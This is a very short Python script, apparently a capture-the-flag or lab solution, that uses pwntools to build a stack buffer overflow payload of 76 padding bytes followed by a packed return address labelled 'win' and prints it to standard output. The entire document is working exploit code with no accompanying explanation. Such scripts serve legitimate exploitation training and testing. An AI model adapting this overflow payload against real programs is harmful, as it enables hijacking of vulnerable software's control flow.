import sys
from pwn import *
payload = b"A" * 76
win = p32(0x5d6e8736)
payload += win
sys.stdout.buffer.write(payload)
